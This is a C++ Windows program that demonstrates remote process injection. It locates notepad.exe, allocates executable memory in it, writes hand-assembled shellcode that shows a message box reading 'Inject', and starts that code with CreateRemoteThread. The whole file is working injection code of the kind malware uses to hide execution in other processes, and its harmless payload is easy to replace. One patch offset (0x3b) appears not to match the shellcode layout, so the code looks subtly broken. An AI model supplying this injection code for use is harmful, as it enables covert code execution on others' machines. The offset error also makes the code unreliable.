#include <iostream>
using namespace std;

#include <Windows.h>
#include <TlHelp32.h>

unsigned char Shellcode[] = {
    0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
    0x48, 0x83, 0xE4, 0xF0, // and rsp, 0xfffffffffffffff0
    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0  hWnd
    0x48, 0xBA, 0x12, 0x12, 0x12, 0x12, 0x12, // movabs rdx, 0x1212121212121212  lpText
    0x12, 0x12, 0x12, 
    0x49, 0xB8, 0x23, 0x23, 0x23, 0x23, 0x23, // movabs r8, 0x2323232323232323  lpCaption
    0x23, 0x23, 0x23, 
    0x45, 0x33, 0xC9, // xor r9d, r9d  uType
    0x48, 0xB8, 0x34, 0x34, 0x34, 0x34, 0x34, // movabs rax, 0x3434343434343434  MessageBoxA Address
    0x34, 0x34, 0x34,
	0x90, 0x90, 
    0xFF, 0xD0, // call rax
    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0
    0x48, 0xB8, 0x45, 0x45, 0x45, 0x45, 0x45, // movabs rax, 0x4545454545454545  RtlExitUserThread Address
    0x45, 0x45, 0x45, 
    0xFF, 0xD0, // call rax
    0x49, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x00, // "Inject" 0x00
};

ULONGLONG MessageBoxAddress = NULL;
ULONGLONG RtlExitUserThreadAddress = NULL;

VOID FindFunctionAddresses() {
	HMODULE hUser32 = LoadLibraryA("user32");
	MessageBoxAddress = (ULONGLONG)GetProcAddress(hUser32, "MessageBoxA");
	cout << MessageBoxAddress << endl;
	RtlExitUserThreadAddress = (ULONGLONG)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
}


DWORD name2pid(LPCSTR ProcessName) {
	DWORD dwProcessId = 0;
	LPPROCESSENTRY32 lppe = new PROCESSENTRY32();
	ZeroMemory(lppe, sizeof(PROCESSENTRY32));

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		cout << "CreateToolhelp32Snapshot" << endl;
		goto Leave;
	}

	lppe->dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnapshot, lppe)) {
		do {
			if (lstrcmp(lppe->szExeFile, ProcessName) == 0) {
				dwProcessId = lppe->th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, lppe));
	}

	CloseHandle(hSnapshot);
Leave:
	return dwProcessId;
}


int main() {
	FindFunctionAddresses();
	if (RtlExitUserThreadAddress == NULL || MessageBoxAddress == NULL) {
		cout << "Error: " << GetLastError() << endl;
		return 0;
	}

	DWORD pid = name2pid(TEXT("notepad.exe"));\

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	LPVOID RemoteShellcode = VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	LPVOID RemoteShellcodeAddress = (LPVOID)((DWORD64)RemoteShellcode + 0x100);

	*((ULONGLONG*)&Shellcode[0x11]) = (ULONGLONG)RemoteShellcodeAddress + 0x47;
	*((ULONGLONG*)&Shellcode[0x1b]) = (ULONGLONG)RemoteShellcodeAddress + 0x47;
	*((ULONGLONG*)&Shellcode[0x28]) = MessageBoxAddress;
	*((ULONGLONG*)&Shellcode[0x3b]) = RtlExitUserThreadAddress;

	WriteProcessMemory(hProcess, RemoteShellcodeAddress, Shellcode, sizeof(Shellcode), NULL);

	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteShellcodeAddress, NULL, 0, NULL);

	CloseHandle(hProcess);
}